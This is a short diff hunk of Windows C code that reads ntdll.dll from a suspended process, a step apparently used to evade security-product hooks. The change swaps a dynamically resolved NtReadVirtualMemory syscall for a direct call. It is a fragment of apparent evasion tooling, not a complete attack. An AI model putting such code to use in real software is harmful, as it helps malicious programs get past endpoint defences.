@@ -61,18 +61,11 @@ BOOL ReadNtdllFromASuspendedProcess(IN PWSTR pwProcessName, OUT PVOID* ppNtdllBu
 		goto _EndOfFunc;
 	}
 #ifdef SYSCALL_ENABLED
-	// Prepare the syscall for NtReadVirtualMemory
-	NtReadVirtualMemory_t pNtReadVirtualMemory = (NtReadVirtualMemory_t)PrepareSyscall((char*)("NtReadVirtualMemory"));
-	if (!pNtReadVirtualMemory) {
-		DebugPrint("[!] Failed to locate NtReadVirtualMemory.\n");
-		return FALSE;
-	}
-
 	// Read the ntdll.dll module from the suspended process memory
 	NTSTATUS STATUS = 0;
 	SIZE_T bytesRead = 0;
 
-	STATUS = pNtReadVirtualMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &bytesRead);
+	STATUS = NtReadVirtualMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &bytesRead);
 	if (!NT_SUCCESS(STATUS) || bytesRead != sNtdllSize) {
 		DebugPrint("[!] NtReadVirtualMemory Failed with Status : 0x%X \n", STATUS);
 		DebugPrint("[i] Read %llu of %llu Bytes \n", bytesRead, (unsigned long long)sNtdllSize);
